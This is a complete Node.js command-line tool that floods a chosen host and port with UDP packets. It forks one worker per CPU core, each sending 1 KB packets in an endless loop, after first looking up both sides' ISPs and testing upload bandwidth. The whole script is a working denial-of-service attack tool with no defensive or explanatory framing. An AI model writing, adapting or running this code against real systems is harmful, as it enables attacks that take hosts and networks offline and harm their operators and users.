#!/usr/bin/env node

const dgram = require('dgram')
const Commander = require('commander')
const cluster = require('cluster')
const os = require('os')
const rp = require('request-promise')
const dns = require('dns-then')
const speedTest = require('speedtest-net')

const commander = Commander.option(
  '-h, --host <host>',
  'Target to flood (can be hostname or IP address)',
  String,
)
  .option('-w, --workers <workers>', 'Number of workers', parseInt)
  .option('-p, --port <port>', 'Port to send packets to', parseInt)
  .parse(process.argv)

const ora = require('ora')

const spinner = ora('Loading')

const port = commander.port || 55555
const workers = commander.workers || os.cpus().length + 1

const client = dgram.createSocket({ type: 'udp4', reuseAddr: true })

client.on('error', () => {
  client.close()
  process.exit(1)
})

client.bind(port)

function sendOne(ip, fport) {
  return new Promise((resolve, reject) => {
    const msg = Buffer.alloc(1024)
    client.send(msg, 0, msg.length, fport, ip, err => (err ? reject(err) : resolve(false)))
  })
}

function until(fn) {
  return fn().then((result) => {
    if (result) {
      return result
    }
    return until(fn)
  })
}

function runWorker() {
  until(() => sendOne(commander.host, port))
}

function testSpeed() {
  return new Promise((resolve, reject) => {
    const test = speedTest({
      maxTime: 5000,
      maxServers: 8,
    })
    test.on('data', resolve)
    test.on('error', reject)
  })
}

async function main() {
  if (!commander.host) {
    spinner.fail('No host specified')
    process.exit()
  }
  if (cluster.isMaster) {
    spinner.start('Getting info')

    const ip = await dns.lookup(commander.host)

    const myIsp = await rp('https://ipinfo.io/org')
    const theirIsp = await rp(`https://ipinfo.io/${ip}/org`)

    spinner.info(`Route: ${myIsp.trim()} ➔ ${theirIsp.trim()}`)
    spinner.start('Testing bandwidth')

    const speed = await testSpeed()
    spinner.info(`Bandwidth: ${speed.speeds.upload} Mbps (tested via ${speed.server.host})`)
    spinner.start('Starting workers')

    for (let i = 0; i < workers; i += 1) {
      cluster.fork()
    }

    spinner.succeed('Started workers')
    spinner.start('Flooding host with packets 😃')
  } else {
    runWorker()
  }
}

main()
